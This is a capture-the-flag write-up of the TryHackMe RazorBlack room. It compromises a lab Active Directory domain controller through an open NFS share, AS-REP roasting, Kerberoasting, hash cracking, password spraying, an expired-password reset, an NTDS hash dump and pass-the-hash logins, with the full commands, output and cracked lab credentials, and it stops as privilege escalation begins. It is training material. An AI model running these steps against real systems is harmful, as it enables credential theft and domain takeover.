---
title: "TryHackMe - RazorBlack"
tags: ["windows", "active-directory", "vhosts", "nfs", "showmount", "libreoffice", "asreproasting", "getnpusers.py", "impacket", "hashcat", "kerberoasting", "getuserspns.py", "evil-winrm", "powershell", "crackmapexec", "smbpasswd.py", "smbmap", "smbclient", "zip2john", "john", "secretsdump.py", "sebackupprivilege", "serestoreprivilege", "diskshadow", "robocopy", "ntds", "xxd"]
---

## Introduction

This is a **TryHackMe** room which can be found at: <a href="https://tryhackme.com/room/raz0rblack" target="_blank">RazorBlack</a>

These guys call themselves hackers. Can you show them who's the boss ??

## Reconnaissance & Scanning

Perform `nmap` scan to identify open ports and services.
- Command: `nmap -p- -T4 10.10.43.148`


```shell
geobour98@kali:~$ nmap -p- -T4 10.10.43.148
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-13 19:00 EET                                                                                  
Nmap scan report for 10.10.43.148 (10.10.43.148)                                                                                               
Host is up (0.067s latency).                                                                                                                     
Not shown: 65506 closed tcp ports (conn-refused)                                                                                                 
PORT      STATE SERVICE                                                                                                                          
53/tcp    open  domain                                                                                                                           
88/tcp    open  kerberos-sec                                                                                                                     
111/tcp   open  rpcbind                                                                                                                          
135/tcp   open  msrpc                                                                                                                            
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49679/tcp open  unknown
49694/tcp open  unknown
49703/tcp open  unknown
49710/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.90 seconds
```

Perform aggressive `nmap` scan to enable OS detection, default scripts and version detection on the found ports. 
- Command: `sudo nmap -A -sC -p 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,5985,9389,47001 10.10.43.148`


```shell
geobour98@kali:~$ sudo nmap -A -sC -p 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,5985,9389,47001 10.10.43.148 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-13 19:04 EET                                                                                  
Nmap scan report for 10.10.43.148 (10.10.43.148)                                                                                               
Host is up (0.068s latency).                                                                                                                     
                                                                                                                                                 
PORT      STATE SERVICE       VERSION                                                                                                            
53/tcp    open  domain        Simple DNS Plus                                                                                                    
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-13 17:05:03Z)                                                     
111/tcp   open  rpcbind       2-4 (RPC #100000)                                                                                                  
| rpcinfo:                                                                                                                                       
|   program version    port/proto  service                                                                                                       
|   100000  2,3,4        111/tcp   rpcbind                                                                                                       
|   100000  2,3,4        111/tcp6  rpcbind                                                                                                       
|   100000  2,3,4        111/udp   rpcbind                                                                                                       
|   100000  2,3,4        111/udp6  rpcbind                                                                                                       
|   100003  2,3         2049/udp   nfs                                                                                                           
|   100003  2,3         2049/udp6  nfs                                                                                                           
|   100003  2,3,4       2049/tcp   nfs                                                                                                           
|   100003  2,3,4       2049/tcp6  nfs                                                                                                           
|   100005  1,2,3       2049/tcp   mountd                                                                                                        
|   100005  1,2,3       2049/tcp6  mountd                                                                                                        
|   100005  1,2,3       2049/udp   mountd                                                                                                        
|   100005  1,2,3       2049/udp6  mountd                                                                                                        
|   100021  1,2,3,4     2049/tcp   nlockmgr                                                                                                      
|   100021  1,2,3,4     2049/tcp6  nlockmgr                                                                                                      
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr                                                                                                      
|   100024  1           2049/tcp   status                                                                                                        
|   100024  1           2049/tcp6  status                                                                                                        
|   100024  1           2049/udp   status                                                                                                        
|_  100024  1           2049/udp6  status                                                                                                        
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                              
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                      
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  mountd        1-3 (RPC #100005)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-13T17:05:50+00:00
|_ssl-date: 2022-11-13T17:05:59+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2022-11-12T16:58:09
|_Not valid after:  2023-05-14T16:58:09
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                      
|_http-title: Not Found                                                                                                                          
9389/tcp  open  mc-nmf        .NET Message Framing                                                                                               
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows 

Host script results:
| smb2-time: 
|   date: 2022-11-13T17:05:54
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   69.73 ms 10.8.0.1 (10.8.0.1)
2   69.72 ms 10.10.43.148 (10.10.43.148)

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   69.73 ms 10.8.0.1 (10.8.0.1)
2   69.72 ms 10.10.43.148 (10.10.43.148)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.03 seconds
```

We notice that the Domain is: `raz0rblack.thm` and the Computer name is: `HAVEN-DC.raz0rblack.thm`.

We can add this domain and its IP in the `/etc/hosts` file.


## Exploitation


We start by enumerating the `NFS Service` on port `2049`, in order to identify any available folders to mount.
- Command: `showmount -e 10.10.43.148`


```shell
geobour98@kali:~$ showmount -e 10.10.43.148
Export list for 10.10.43.148:
/users (everyone)
```

We can mount the `/users` folder in `/mnt/raz0rblack`, after creating that folder.
- Command: `sudo mount -t nfs 10.10.43.148:/users /mnt/raz0rblack`


```shell
geobour98@kali:~$ sudo mkdir /mnt/raz0rblack
geobour98@kali:~$ sudo mount -t nfs 10.10.43.148:/users /mnt/raz0rblack
geobour98@kali:~$ sudo cat /mnt/raz0rblack/sbradley.txt
[REDACTED]
geobour98@kali:~$ sudo libreoffice /mnt/raz0rblack/employee_status.xlsx
```

We first found the `Steven's` flag from `/mnt/raz0rblack/sbradley.txt`. Also, we can guess from `sbradley.txt` that the username format is first letter from first name concatenated with last name (e.x steven bradley -> `sbradley`).

By opening the `/mnt/raz0rblack/employee_status.xlsx` with `libreoffice`, we find a list of first and last names.
- Command: `libreoffice employee-status.xlsx`


```text
daven port
imogen royce
tamara vidal
arthur edwards
carl ingram
nolan cassidy
reza zaydan
ljudmila vetrova
rico delgado
tyson williams
steven bradley
chamber lin
```

Now we can create a wordlist of usernames in the username format found. It should look like this:


```text
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin
```

We can use this wordlist (`usernames.txt`) in order to perform `ASREPRoasting` attack, which is used to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will then be encrypted with the user's password, which can then be cracked offline.

That's why we will use the script `GetNPUsers.py` from `impacket`.
- Command: `/opt/impacket/examples/GetNPUsers.py raz0rblack.thm/ -usersfile usernames.txt`


```shell
geobour98@kali:~$ /opt/impacket/examples/GetNPUsers.py raz0rblack.thm/ -usersfile usernames.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:b06cf7e41f643f8b3125503cfe1da6f0$5b13a70865c099fb16a7205ad2baf0acdef3467ce49313f512e14594dd4b6cab244fb6b37827dc8a098bf782885da1dbfed88623ca32e03a74b64775b6c0b20995c2ef6aeb16673e47625cfc331d08a20bd9e5ea8e6ff4b4ed6e36a46331e077eafd1e2dc97e18d6f553462f244e31083786f3a15d5427b4168e86c1cb6376bbbeeff64352082c0f2b00f5dfe0162e8d422e09dee2da12fdf9422a8c74c8185c752c181d79c24f091de9aeab5865cff73d7d2c03e3f6983f7473b0c028ddbff2bf0eb3f4d8a902273a8d38c4fc0e4aa42ed96abbdf07a4c58cb4ecbfbcd7b916a9340ea6b38f8ef086f61bf386b37c55
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

We found the hash for the user `twilliams`, which we put in a file and crack it with `hashcat` on mode `18200`.
- Command: `hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`


```shell
geobour98@kali:~$ hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
<snip>
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:b06cf7e41f643f8b3125503cfe1da6f0$5b13a70865c099fb16a7205ad2baf0acdef3467ce49313f512e14594dd4b6cab244fb6b37827dc8a098bf782885da1dbfed88623ca32e03a74b64775b6c0b20995c2ef6aeb16673e47625cfc331d08a20bd9e5ea8e6ff4b4ed6e36a46331e077eafd1e2dc97e18d6f553462f244e31083786f3a15d5427b4168e86c1cb6376bbbeeff64352082c0f2b00f5dfe0162e8d422e09dee2da12fdf9422a8c74c8185c752c181d79c24f091de9aeab5865cff73d7d2c03e3f6983f7473b0c028ddbff2bf0eb3f4d8a902273a8d38c4fc0e4aa42ed96abbdf07a4c58cb4ecbfbcd7b916a9340ea6b38f8ef086f61bf386b37c55:roastpotatoes
<snip>
```

So, the cleartext password for `twilliams` is `roastpotatoes`.

Now, we can perform the `Kerberoasting` attack, which attempts to fetch Service Principal Names that are associated with normal user accounts. A ticket that is encrypted with the user account’s password is returned, which can then be bruteforced offline.
- Command: `/opt/impacket/examples/GetUserSPNs.py raz0rblack.thm/twilliams:'roastpotatoes' -request`


```shell
geobour98@kali:~$ /opt/impacket/examples/GetUserSPNs.py raz0rblack.thm/twilliams:'roastpotatoes' -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 17:17:17.715160  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$3ca38240ade1692b388a4bc390cae312$0373c43411844cc70a8ae3a2590c26437aaff5ecb3c41f9c8b1ae0382c6da4753b01d9a515166ee58b34c72ca9bc74a393383fe31753619e80ae354bc4f89153cccba98c2ba0e0f8b4dc34ef7121ab40136461fc68c1ca17d2e60b83d89abcf6276391bbc7a2567a696f25354aaf0e8921db7f8f178bd38fdaf8ac1c4e6810c6f34a835ef4df865308c21b9425b8373e7569fc4efac5b7de00ae1ab769f975dc9b1ce4c58d4d48a591c7d065a4daf62f1842f4d649c3ebc1ceb9a066f03abd11c0833f78713e17a91205843486ef32ced30bcc296a471bd433c705c9a1b4bd7c944e0510f2ac7ee503d1ad95ff4487be4679e76789d5a3e09464342a0530e453aaf6147802c88a124c4617636d6f44222baa13fbdc32f3b00d31d02a42408468603f36d5c2059dfd34d58e50dc245f6f2a6036b66f144cd1927550beba20d6f2e486bf7f3d4e559d5d00218c7dc9a117ac884cd775850bfd539e1529e0837f1f5e68436cbce0de0fb3e1ca0fe720713605cb6142e60f3ad609bb68497f85b9d4b826200ec9287ed135e42d5f93af7dfa5e6f95afac4cda3742fd3e155e47f8d45143974240a181de24fe565196756a2dbbe66da4e1ccebea5af684512dd04b9bce9c501364e3f39ed585ae35d7f85fba466e6a6fb0214285e83244898a272979d1b685b89d59c6bdb0a7f98a079f1367df28415c5436d2436e5b050a4916f2eddf2954760902bee150ab6a8edb3876f1067d1eebcb3dbdb4621791143a4429d3267f36b57e22bb9966dc943e943963a85f2f570d00d2370245db817d9f3d1099fed9e71a49b3c6f5d1d7c2dbbe33f2ebdff00898064ca2776a0175e7749307d079fd1d4b25bde2d0921d15cbfb10a1781f21ea62748ebae5d14cac0cd2c80bea1ae483e53de85947d4621edf249739cf5935e52f63481e9e11822e08389f75dc3a31f5781b8bbab9cebfb4d04e819a133878d15633f7cea8e80f25d9cad0cad34827fcc3172155d7e04b59b243b4c631781468adfe081da1130435e1a1c3ed06ddacb001a29cf19f2cce09f0786e04fbaec392554a19adcd6838c329d957e5e660121f7acc07742491318b6e74b83861fa192aeac5a9c41c86021d83997016f318340efceffc33e50282d62cce352aff6e0f1c89e73fdc2450618d30c7f02954fad1321003b8117beb3153264d057b43dc52092fc5bcda4d074399705e0f3c53832e9afbd3464645ccdf54c23daa6a2e1b9658845be09666d85ec9f2943fc860d6bce32ed0f2e30faeee2dd26c9ed9a883658d29cc9b5ec55f6abb55c7241ce08281fad87492192555a2a8c2483cfb51845a5dd407cca4f5f8e5008b4bc0de16ae477b46213be0220922d892d2a11fc828a5c78609db87d4ac6919c7478deb134028c35ac061589738c22dedbca6b3ce
```


We found the hash for the user `xyan1d3`, which we can put in a file and crack it with `hashcat` on mode `13100`.
- Command: `hashcat -m 13100 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt`


```shell
geobour98@kali:~$ hashcat -m 13100 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt
<snip>
$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$3ca38240ade1692b388a4bc390cae312$0373c43411844cc70a8ae3a2590c26437aaff5ecb3c41f9c8b1ae0382c6da4753b01d9a515166ee58b34c72ca9bc74a393383fe31753619e80ae354bc4f89153cccba98c2ba0e0f8b4dc34ef7121ab40136461fc68c1ca17d2e60b83d89abcf6276391bbc7a2567a696f25354aaf0e8921db7f8f178bd38fdaf8ac1c4e6810c6f34a835ef4df865308c21b9425b8373e7569fc4efac5b7de00ae1ab769f975dc9b1ce4c58d4d48a591c7d065a4daf62f1842f4d649c3ebc1ceb9a066f03abd11c0833f78713e17a91205843486ef32ced30bcc296a471bd433c705c9a1b4bd7c944e0510f2ac7ee503d1ad95ff4487be4679e76789d5a3e09464342a0530e453aaf6147802c88a124c4617636d6f44222baa13fbdc32f3b00d31d02a42408468603f36d5c2059dfd34d58e50dc245f6f2a6036b66f144cd1927550beba20d6f2e486bf7f3d4e559d5d00218c7dc9a117ac884cd775850bfd539e1529e0837f1f5e68436cbce0de0fb3e1ca0fe720713605cb6142e60f3ad609bb68497f85b9d4b826200ec9287ed135e42d5f93af7dfa5e6f95afac4cda3742fd3e155e47f8d45143974240a181de24fe565196756a2dbbe66da4e1ccebea5af684512dd04b9bce9c501364e3f39ed585ae35d7f85fba466e6a6fb0214285e83244898a272979d1b685b89d59c6bdb0a7f98a079f1367df28415c5436d2436e5b050a4916f2eddf2954760902bee150ab6a8edb3876f1067d1eebcb3dbdb4621791143a4429d3267f36b57e22bb9966dc943e943963a85f2f570d00d2370245db817d9f3d1099fed9e71a49b3c6f5d1d7c2dbbe33f2ebdff00898064ca2776a0175e7749307d079fd1d4b25bde2d0921d15cbfb10a1781f21ea62748ebae5d14cac0cd2c80bea1ae483e53de85947d4621edf249739cf5935e52f63481e9e11822e08389f75dc3a31f5781b8bbab9cebfb4d04e819a133878d15633f7cea8e80f25d9cad0cad34827fcc3172155d7e04b59b243b4c631781468adfe081da1130435e1a1c3ed06ddacb001a29cf19f2cce09f0786e04fbaec392554a19adcd6838c329d957e5e660121f7acc07742491318b6e74b83861fa192aeac5a9c41c86021d83997016f318340efceffc33e50282d62cce352aff6e0f1c89e73fdc2450618d30c7f02954fad1321003b8117beb3153264d057b43dc52092fc5bcda4d074399705e0f3c53832e9afbd3464645ccdf54c23daa6a2e1b9658845be09666d85ec9f2943fc860d6bce32ed0f2e30faeee2dd26c9ed9a883658d29cc9b5ec55f6abb55c7241ce08281fad87492192555a2a8c2483cfb51845a5dd407cca4f5f8e5008b4bc0de16ae477b46213be0220922d892d2a11fc828a5c78609db87d4ac6919c7478deb134028c35ac061589738c22dedbca6b3ce:cyanide9amine5628
<snip>
```

So, the cleartext password for `xyan1d3` is `cyanide9amine5628`.

We can login as `xyan1d3` using `evil-winrm`. In order to find the `xyan1d3's` flag we need to retrieve (decrypt) some `secret` data from PowerShell. We can find the commands here: <a href="https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx" target="_blank">How To Save and Read Sensitive Data with PowerShell</a>.


```shell
geobour98@kali:~$ evil-winrm -i 10.10.43.148 -u xyan1d3 -p cyanide9amine5628                                                                                   
                                                                                                                                                 
Evil-WinRM shell v3.4                                                                                                                            
                                                                                                                                                 
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine          

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\xyan1d3\Documents> cd ..
*Evil-WinRM* PS C:\Users\xyan1d3> dir
<snip>
-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml
<snip>
*Evil-WinRM* PS C:\Users\xyan1d3> $credential = Import-CliXml -Path xyan1d3.xml
*Evil-WinRM* PS C:\Users\xyan1d3> $credential.GetNetworkCredential().Password
LOL here it is -> [REDACTED]
```

Now we can use `crackmapexec` on `SMB` in order to identify if any user has access to any share. Before doing this we create a file with the found passwords so far (`passwords.txt`), which should look like this:


```text
roastpotatoes
cyanide9amine5628
```

- Command: `crackmapexec smb 10.10.43.148 -u usernames.txt -p passwords.txt --continue-on-success`


```shell
geobour98@kali:~$ crackmapexec smb 10.10.136.136 -u usernames.txt -p passwords.txt --continue-on-success
SMB         10.10.43.148    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\dport:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\dport:cyanide9amine5628 STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\iroyce:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\iroyce:cyanide9amine5628 STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\tvidal:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\tvidal:cyanide9amine5628 STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\aedwards:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\aedwards:cyanide9amine5628 STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\cingram:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\cingram:cyanide9amine5628 STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\ncassidy:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\ncassidy:cyanide9amine5628 STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\rzaydan:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\rzaydan:cyanide9amine5628 STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:cyanide9amine5628 STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:cyanide9amine5628 STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\twilliams:cyanide9amine5628 STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:cyanide9amine5628 STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\clin:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.43.148    445    HAVEN-DC         [-] raz0rblack.thm\clin:cyanide9amine5628 STATUS_LOGON_FAILURE
```

The most interesting finding is: `raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE`, which means that we are able to change the password of the user `sbradley` from `roastpotatoes` to whatever we want. We could do this with `smbpasswd` but didn't work for me, so i used `smbpasswd.py` from `impacket`.
- Command: `sudo python3 /opt/impacket/examples/smbpasswd.py sbradley:roastpotatoes@10.10.43.148 -newpass password`


```shell
geobour98@kali:~$ sudo python3 /opt/impacket/examples/smbpasswd.py sbradley:roastpotatoes@10.10.43.148 -newpass password
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.
```

Now we can login to `SMB` using the credentials `sbradley:password`.
- Command: `smbmap -H 10.10.43.148 -u sbradley -p password`


```shell
geobour98@kali:~$ smbmap -H 10.10.43.148 -u sbradley -p password
[+] IP: 10.10.43.148:445        Name: 10.10.43.148                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        trash                                                   READ ONLY       Files Pending for deletion
```


We notice that the user `sbradley` has `READ` access to the `trash` share. We download all the files in that share.


```shell
geobour98@kali:~$ smbclient \\\\10.10.43.148\\trash -U sbradley
Password for [WORKGROUP\sbradley]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Mar 16 08:01:28 2021
  ..                                  D        0  Tue Mar 16 08:01:28 2021
  chat_log_20210222143423.txt         A     1340  Thu Feb 25 21:29:05 2021
  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 08:02:20 2021
  sbradley.txt                        A       37  Sat Feb 27 21:24:21 2021

                5101823 blocks of size 4096. 950782 blocks available
smb: \> prompt off
smb: \> mget *
getting file \chat_log_20210222143423.txt of size 1340 as chat_log_20210222143423.txt (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
getting file \experiment_gone_wrong.zip of size 18927164 as experiment_gone_wrong.zip (1573.3 KiloBytes/sec) (average 1479.9 KiloBytes/sec)
getting file \sbradley.txt of size 37 as sbradley.txt (0.1 KiloBytes/sec) (average 1429.9 KiloBytes/sec)
```

The zip file (`experiment_gone_wrong.zip`) has a password, so we can generate a hash of the file using `zip2john` and crack it with `john`.


```shell
geobour98@kali:~$ zip2john experiment_gone_wrong.zip > experiment.hash
geobour98@kali:~$ john -w=/usr/share/wordlists/rockyou.txt experiment.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
electromagnetismo (experiment_gone_wrong.zip)     
1g 0:00:00:10 DONE (2022-11-14 23:28) 0.09532g/s 799676p/s 799676c/s 799676C/s elliotfrost..ejsa457
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now we can `unzip` the file and see it's contents using the password `electromagnetismo`.


```shell
geobour98@kali:~$ unzip experiment_gone_wrong.zip 
Archive:  experiment_gone_wrong.zip
[experiment_gone_wrong.zip] system.hive password: 
  inflating: system.hive             
  inflating: ntds.dit
```

Having found the files `system.hive` and `ntds.dit` we can use the script `secretsdump.py` from `impacket` in order to extract all the `NT hashes`. We will add the `-just-dc-ntlm` flag to return only the `NTLM` hashes. Also, we will execute some linux commands to generate a wordlist of `NTLM` hashes in the correct form.
- Command: `sudo /opt/impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL -just-dc-ntlm | cut -d ":" -f 4 | grep -wE '^.{32}' > hashes.txt`


```shell
geobour98@kali:~$ sudo /opt/impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL -just-dc-ntlm | cut -d ":" -f 4 | grep -wE '^.{32}' > hashes.txt
geobour98@kali:~$ head -n 10 hashes.txt
1afedc472d0fdfe07cd075d36804efd0
31d6cfe0d16ae931b73c59d7e0c089c0
4ea59b8f64c94ec66ddcfc4e6e5899f9
703a365974d7c3eeb80e11dd27fb0cb3
da3542420eff7cfab8305a68b7da7043
c378739d7c136c1281d06183665702ea
9f73aaafc3b6d62acdbb0b426f302f9e
6a5bad944868142e65ad3049a393e587
b112332330f11267486d21549d326bd5
f9b8c9864aa7bc53405ed45b48ef19ef
```


The first 10 lines of the file `hashes.txt` should look like above.

Now we can run `crackmapexec` to see if we can login via `winrm` with another user using their hash.
- Command: `crackmapexec winrm 10.10.43.148 -u usernames.txt -H hashes.txt`


```shell
geobour98@kali:~$ crackmapexec winrm 10.10.43.148 -u usernames.txt -H hashes.txt
<snip>
WINRM       10.10.43.148     5985   HAVEN-DC         [+] raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d (Pwn3d!)
<snip>
```

So, the `ljudmila's` hash (`ljudmila vetrova`) is `f220d3988deb3f516c73f40ee16c431d` and we can use `evil-winrm` to login as `lvetrova`. We need to follow the same process we did for `xyan1d3` in order to view the flag.
- Command: `evil-winrm -i 10.10.43.148 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d`


```shell
geobour98@kali:~$ evil-winrm -i 10.10.43.148 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\lvetrova\Documents> cd ../
*Evil-WinRM* PS C:\Users\lvetrova> $credential = Import-CliXml -Path lvetrova.xml
*Evil-WinRM* PS C:\Users\lvetrova> $credential.GetNetworkCredential().Password
[REDACTED]
*Evil-WinRM* PS C:\Users\lvetrova>
```


## Privilege Escalation


We go back and login with `evil-winrm` as the user `xyan1d3`. Then, we run `whoami /priv` to identify the security privileges of this user.


```shell
geobour98@kali:~$ evil-winrm -i 10.10.43.148 -u xyan1d3 -p cyanide9amine5628                                                            
                                                                                                                         
Evil-WinRM shell v3.4                                                                                                    
                                                                                                                         
